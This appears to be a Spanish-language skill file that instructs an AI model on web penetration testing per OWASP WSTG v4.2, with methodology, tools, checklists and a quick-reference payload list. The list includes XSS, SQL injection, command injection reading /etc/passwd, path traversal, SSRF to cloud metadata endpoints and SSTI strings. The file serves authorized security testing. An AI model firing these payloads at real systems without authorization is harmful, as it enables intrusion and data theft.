---
name: wstg-web-pentest
description: >
  Habilidad experta de hacking web y pruebas de penetración basada en el OWASP Web Security Testing Guide v4.2 (WSTG).
  Úsala SIEMPRE que el usuario mencione: pentesting web, pruebas de seguridad, vulnerabilidades web, hacking ético,
  bug bounty, CTF web, auditorías de seguridad, OWASP, XSS, SQL injection, CSRF, SSRF, LFI, RFI, command injection,
  authentication bypass, session hijacking, directory traversal, subdomain takeover, cloud misconfig, broken access control,
  information gathering, fingerprinting, recon, fuzzing, burp suite, ZAP, nikto, sqlmap, o cualquier test de seguridad
  en aplicaciones web. También aplica cuando el usuario pide metodologías, checklists, payloads, técnicas de bypass
  de filtros WAF, o análisis de respuestas HTTP para encontrar vulnerabilidades. Esta habilidad contiene la metodología
  completa con IDs WSTG estandarizados, técnicas detalladas, herramientas y payloads para cada categoría de prueba.
---

# OWASP WSTG v4.2 — Habilidad Completa de Pentesting Web

## Índice de Referencia Rápida

| Categoría | IDs | Detalle |
|-----------|-----|---------|
| Information Gathering | WSTG-INFO-01..10 | Ver `references/01-info-gathering.md` |
| Configuration & Deployment | WSTG-CONF-01..11 | Ver `references/02-config-deployment.md` |
| Identity Management | WSTG-IDNT-01..05 | Ver `references/03-identity-mgmt.md` |
| Authentication | WSTG-ATHN-01..10 | Ver `references/04-authentication.md` |
| Authorization | WSTG-ATHZ-01..04 | Ver `references/05-authorization.md` |
| Session Management | WSTG-SESS-01..09 | Ver `references/06-session-mgmt.md` |
| Input Validation | WSTG-INPV-01..19 | Ver `references/07-input-validation.md` |
| Error Handling | WSTG-ERRH-01..02 | Ver `references/08-error-handling.md` |
| Weak Cryptography | WSTG-CRYP-01..04 | Ver `references/09-cryptography.md` |
| Business Logic | WSTG-BUSL-01..09 | Ver `references/10-business-logic.md` |
| Client-side Testing | WSTG-CLNT-01..13 | Ver `references/11-client-side.md` |
| API Testing | WSTG-APIT-01 | Ver `references/12-api-testing.md` |

---

## Marco Metodológico OWASP

### Fases de Testing (SDLC)
1. **Antes del desarrollo**: Definir SDLC seguro, revisar políticas
2. **Diseño**: Revisar requerimientos de seguridad, arquitectura, modelos de amenaza (STRIDE)
3. **Desarrollo**: Code walkthrough, code review estático
4. **Despliegue**: Penetration testing, configuration management testing
5. **Mantenimiento**: Revisiones periódicas, health checks, change verification

### Tipos de Testing
- **Black-box**: Sin conocimiento previo del sistema
- **Gray-box**: Conocimiento parcial (credenciales, documentación parcial)
- **White-box**: Acceso completo al código fuente

### Metodologías de Referencia
- PTES (Penetration Testing Execution Standard): Pre-engagement → Intel → Threat Modeling → Vuln Analysis → Exploitation → Post-Exploitation → Reporting
- PCI DSS 11.3: Pruebas internas y externas, cobertura de CDE
- NIST SP 800-115: Review, Target Identification, Vulnerability Validation
- OSSTMM: Seguridad operacional, canales, métricas de confianza

---

## Principios Fundamentales

1. **No hay bala de plata**: Las herramientas automatizadas no reemplazan el juicio experto
2. **Pensar como atacante**: Ir más allá del camino feliz; usar misuse cases
3. **Enfoque balanceado**: Combinar manual + automatizado, black-box + white-box
4. **Test early, test often**: Integrar seguridad desde el diseño
5. **Documentar todo**: Registrar metodología, herramientas, hallazgos, evidencias
6. **Métricas CVSS**: Calificar severidad; priorizar high → medium → low

---

## Formato de Reporte de Vulnerabilidades

```
ID: WSTG-<CATEGORIA>-<NN>
Título: [Nombre descriptivo]
Severidad: Crítica / Alta / Media / Baja / Informativa
CVSS Score: [puntuación]
Descripción: [qué es la vulnerabilidad]
Evidencia: [request/response, screenshot, payload usado]
Impacto: [consecuencias de explotación]
Causa raíz: [bug de código, fallo de diseño, mala configuración]
Remediación: [pasos concretos para corregir]
Referencias: [OWASP, CVE, CWE]
```

---

## Herramientas por Categoría

### Proxies e Interceptores
- **Burp Suite** (proxy, scanner, intruder, repeater, decoder, comparer)
- **OWASP ZAP** (proxy, active/passive scanner, fuzzer, spider)
- **Fiddler**, **mitmproxy**

### Reconocimiento y OSINT
- `nmap -sV -sC -p- --script=http-*`
- `nikto -h <target>`, `whatweb`, `wappalyzer`
- Google Dorks: `site:`, `inurl:`, `intitle:`, `filetype:`, `cache:`
- `shodan`, `censys`, `theHarvester`, `amass`, `sublist3r`
- `dnsrecon`, `dig`, `host`, `nslookup`
- Wayback Machine, `waybackurls`

### Fuzzing y Fuerza Bruta
- `ffuf`, `gobuster`, `dirbuster`, `wfuzz`
- `hydra`, `medusa` (auth brute force)
- FuzzDB, SecLists (wordlists)

### Explotación
- `sqlmap` (SQL injection automatizado)
- `BeEF` (browser exploitation framework)
- `metasploit`
- `commix` (command injection)
- `XSStrike`, `dalfox` (XSS)
- `ssrfuzz`, `gopherus` (SSRF)

### TLS/Crypto
- `testssl.sh`, `sslyze`, `sslscan`
- SSL Labs online scanner
- `openssl s_client`

### Cloud
- `aws cli`, `gcloud`, `az` (cloud storage testing)
- `pacu` (AWS pentesting framework)

---

## Guía de Uso de Referencias

Para cada categoría de prueba, consulta el archivo de referencia correspondiente. Cada archivo contiene:
- Objetivos del test
- Técnicas de detección (black-box y gray-box)
- Payloads y ejemplos concretos
- Herramientas específicas
- Remediaciones

**Lee el archivo de referencia antes de responder preguntas técnicas detalladas** sobre esa categoría.

---

## Quick Reference: Payloads Básicos por Categoría

### XSS (WSTG-INPV-01/02/CLNT-01)
```
<script>alert(1)</script>
"><script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>
'-alert(1)-'
\"-alert(1)//
```

### SQL Injection (WSTG-INPV-05)
```
'
''
`
')
'))
1' OR '1'='1
1' OR '1'='1'--
1' OR '1'='1'/*
' OR 1=1--
admin'--
1 UNION SELECT null--
1 ORDER BY 10--
```

### Command Injection (WSTG-INPV-12)
```
; ls
| ls
&& ls
`ls`
$(ls)
; cat /etc/passwd
| cat /etc/passwd
```

### Path Traversal (WSTG-ATHZ-01)
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
%252e%252e%252f
```

### SSRF (WSTG-INPV-19)
```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/ (AWS)
http://[::1]/
http://0.0.0.0/
file:///etc/passwd
dict://localhost:6379/
gopher://localhost:9200/
```

### SSTI (WSTG-INPV-18)
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

---

## Checklist Rápido por Área

### Recon Inicial (ejecutar siempre primero)
- [ ] Google dorks: `site:target.com filetype:pdf/xls/doc`
- [ ] robots.txt, sitemap.xml, security.txt
- [ ] Subdomain enumeration: `amass enum -d target.com`
- [ ] Port scan: `nmap -sV -sC -p- target.com`
- [ ] Banner grabbing / fingerprinting
- [ ] HTTP headers analysis
- [ ] JavaScript files review (API keys, endpoints ocultos)
- [ ] Source map files (.map)
- [ ] Wayback Machine para URLs históricas

### Auth y Sesiones (siempre probar)
- [ ] Credenciales por defecto
- [ ] Account enumeration (mensajes de error diferenciados)
- [ ] Brute force (¿hay lockout?)
- [ ] Cookie attributes: Secure, HttpOnly, SameSite
- [ ] Session fixation
- [ ] CSRF en operaciones críticas
- [ ] JWT: alg:none, weak secret, RS256→HS256

### Input Validation (en cada parámetro)
- [ ] XSS reflejado y almacenado
- [ ] SQLi: `'`, `"`, `\`, operadores booleanos
- [ ] Command injection
- [ ] Path traversal
- [ ] SSRF en parámetros con URLs
- [ ] XXE en XML bodies
- [ ] SSTI en templates
- [ ] LDAP injection en campos de búsqueda
- [ ] HTTP header injection (Host, X-Forwarded-For)

### Configuración (verificar siempre)
- [ ] HTTP methods habilitados (OPTIONS, PUT, DELETE, TRACE)
- [ ] HSTS presente y válido
- [ ] CORS policy restrictiva
- [ ] Archivos de backup expuestos (.bak, .old, ~, .swp)
- [ ] Admin interfaces accesibles
- [ ] Cloud storage público (S3, GCS, Azure Blob)
- [ ] Subdomain takeover (CNAME a servicios no reclamados)
- [ ] TLS: versión ≥1.2, sin cipher suites débiles
